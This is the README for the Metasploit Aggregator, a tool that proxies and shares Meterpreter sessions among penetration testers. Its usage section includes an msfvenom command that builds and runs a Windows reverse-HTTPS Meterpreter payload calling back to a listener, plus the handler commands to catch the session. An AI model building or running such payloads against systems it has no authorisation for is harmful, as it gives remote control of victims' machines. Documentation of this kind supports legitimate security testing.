Metasploit [![Build Status](https://travis-ci.org/rapid7/metasploit-aggregator.svg?branch=master)](https://travis-ci.org/rapid7/metasploit-aggregator) [![Code Climate](https://img.shields.io/codeclimate/github/rapid7/metasploit-aggregator.svg)](https://codeclimate.com/github/rapid7/metasploit-aggregator)
==
The Metasploit Aggregator is released under a BSD-style license. [See
LICENSE](https://github.com/rapid7/metasploit-aggregator/blob/master/LICENSE) for more details.

Bug tracking and development information can be found at:
 https://github.com/rapid7/metasploit-aggregator

New bugs and feature requests should be directed to:
  https://github.com/rapid7/metasploit-aggregator/issues/new

Questions and suggestions can be sent to:
  https://groups.google.com/forum/#!forum/metasploit-hackers

## Metasploit Aggregator

The Metasploit Aggregator is a proxy for Meterpreter sessions. Normally, Meterpreter sessions connect directly to a Metasploit listener. However, this has a few problems:

 1. Multiple users cannot easily share the session once it is established, without some sort of external multiplexing scheme, such as running msfconsole in a screen session. While Metasploit Pro solves this issue to a certain extent, it is also limited by the number of users that can simultaneously  interact with shared sessions.

 1. Running a full msfconsole on a remote listener is resource intensive because it uses multiple threads per connection. It has a hard time scaling reliably to thousands of sessions, and even fewer on Windows platforms.

 1. The design requires either running different copies of msfconsole, or putting all of your eggs in one basket. It is difficult to distribute sessions across many endpoints and have a global view of them all.

The Metasploit Aggregator solves these problems by implementing an event-driven listener that stands between msfconsole and Meterpreter. It can scale to thousands of connections, but only needs to make a single connection with Metasploit Framework to manage them all.  Sessions can be shared between multiple users without any changes to the Meterpreter session
Itself, such as by modifying the session transport configuration. The redirection of a session occurs behind the scenes on the control channel between Metasploit Aggregator and msfconsole.

## Glossary

Metasploit Aggregator introduces a few new concepts.

* A **‘parked’** session is one that is terminated entirely by Metasploit Aggregator. This means that the minimal interaction with the session to simply keep it alive is handled by the aggregator automatically. A user can attach to a session at any time in order to interact with it.

* A **‘cable’** is a listening port that the aggregator opens to accept new connections from Meterpreter. This is analogous to starting a handler on msfconsole.

* The **‘default forward’** address is the location of a msfconsole instance that serves as a helper for Metasploit Aggregator. Metasploit Aggregator currently does not know how to handle staged sessions, request session details, or how to deal with AutoRun scripts. The default forward is where a session connecting to a cable is redirected on initial connection. The connection is enumerated for details of the target and continues to communicates with the default forward until requested specifically by another console or parked by request of the default forward.

* A **‘forwarded’** session is one that terminates at the aggregator, but is then proxied to a msfconsole instance. The session is forwarded over a control channel connection to the aggregator. When you are done interacting with a session, it can be moved back to a ‘parked’ state for other users to use. Note: any user can steal a session if desired and forward it to a different msfconsole instance.

## Installing
Standalone installation: ```gem install metasploit-aggregator```.

## Usage

To use Metasploit Aggregator, first start an instance of the aggregator itself. This is automatically packaged with Metasploit Framework, or can be installed standalone by running `gem install metasploit-aggregator`. The aggregator binary is called `metasploit-aggregator`, and listens on address 127.0.0.1, port 2447. Because the aggregator does not provide encryption or authentication by itself, to connect to a remote instance, we suggest using SSH port forwarding or some other tunneling technology to reach a remote aggregator.

On the system hosting the aggregator:
```
metasploit-framework$ metasploit-aggregator 
2017-03-06 13:17:32 -0600 Starting administration service on 127.0.0.1:2447
```

On the client system:
```
ssh user@aggregator -L 127.0.0.1:2447:127.0.0.1:2447
```

Next, start a msfconsole instance and load the aggregator plugin. This will allow you to interact with the remote aggregator. This is also required to setup the default forward msfconsole instance. Setup the msfconsole instance to be the default forward. This instance will see all connections when they first arrive.

```none
metasploit-framework$ ./msfconsole 
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v4.14.1-dev-5383900                  ]
+ -- --=[ 1627 exploits - 928 auxiliary - 282 post        ]
+ -- --=[ 472 payloads - 39 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > load aggregator 
[*] Aggregator interaction has been enabled
[*] Successfully loaded plugin: aggregator
msf > aggregator_connect 127.0.0.1:2447
[*] Connecting to Aggregator instance at 127.0.0.1:2447...
msf > 
```

Startup a new cable to begin listening for Meterpreter sessions from the aggregator. You can optionally specify an SSL certificate for it to serve over HTTPS as well. You can verify that the cable is listening with the `aggregator_cables` command. This will also start a new handler automatically on the default forward instance of msfconsole to handle new sessions as they arrive.

```
msf > aggregator_cable_add 192.168.1.10:8443
msf > aggregator_default_forward 
msf >
```

Now, point a Meterpreter session at the cable address and port. You should see a new session on the default forward console. You can now park this session with the aggregator_session_park command.

```
C:\metasploit-framework> msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.1.10 LPORT=8443 -f exe -o launch-stageless.exe
C:\metasploit-framework> launch-stageless.exe
```

Resulting session created:

```
msf > [*] Meterpreter session 1 opened (127.0.0.1:53414 -> 127.0.0.1:53519) at 2017-03-06 13:46:23 -0600
```

To view all available sessions, use the aggregator_sessions command:

```
msf > aggregator_sessions
[*] Sessions found:
[*] 	 Remote ID: 1
[*] 	      Type: meterpreter windows
[*] 	      Info: DESKTOP-KAO0P3O\user @ DESKTOP-NAME
[*] 	    Tunnel: 192.168.1.10:8443 -> 192.168.1.11:53528
[*] 	       Via: exploit/multi/handler
[*] 	      UUID: 8121940d2f5c4b1f/x86=1/windows=0/2016-12-15T22:03:16Z
[*] 	 MachineID: 1e2b16f37eab2324b9089cd93f16533b
[*] 	   CheckIn: 3s ago
[*] 	Registered: Not Yet Implemented
[*] 	   Forward: 50ab485d-dbe3-4045-95c4-c9abd45c1683
[*] 	Session ID: 1
[*] 
```

To forward an available session to your console, use the aggregator_session_forward command:

```
msf > aggregator_sessions
[*] Sessions found:
[*] 	 Remote ID: 1
[*] 	      Type: meterpreter windows
[*] 	      Info: DESKTOP-KAO0P3O\user @ DESKTOP-NAME
[*] 	    Tunnel: 192.168.1.10:8443 -> 192.168.1.11:53528
[*] 	       Via: exploit/multi/handler
[*] 	      UUID: 8121940d2f5c4b1f/x86=1/windows=0/2016-12-15T22:03:16Z
[*] 	 MachineID: 1e2b16f37eab2324b9089cd93f16533b
[*] 	   CheckIn: 6s ago
[*] 	Registered: Not Yet Implemented
[*] 	   Forward: parked
[*] 
msf > aggregator_session_forward 1
msf > [*] Meterpreter session 2 opened (127.0.0.1:53414 -> 127.0.0.1:54066) at 2017-03-06 13:50:51 -0600
```

Finally, to disconnect from the aggregator, use the aggregator_disconnect command:

```
msf > aggregator_disconnect 
[*] 127.0.0.1 - Meterpreter session 2 closed.
msf > 
```

During disconnect, the console will park any sessions explicitly requested by the user.  If the console is registered as the “default forward” any sessions that have not been specifically requested will park, however the next console that registers as the default forward will be passed these passively parked sessions.

## Contributing
[Contributing](https://github.com/rapid7/metasploit-aggregator/blob/master/CONTRIBUTING.md).

Expanding protobuf service use
```grpc_tools_ruby_protoc -I ../protos --ruby_out=lib --grpc_out=lib ../protos/metasploit/aggregator/*```

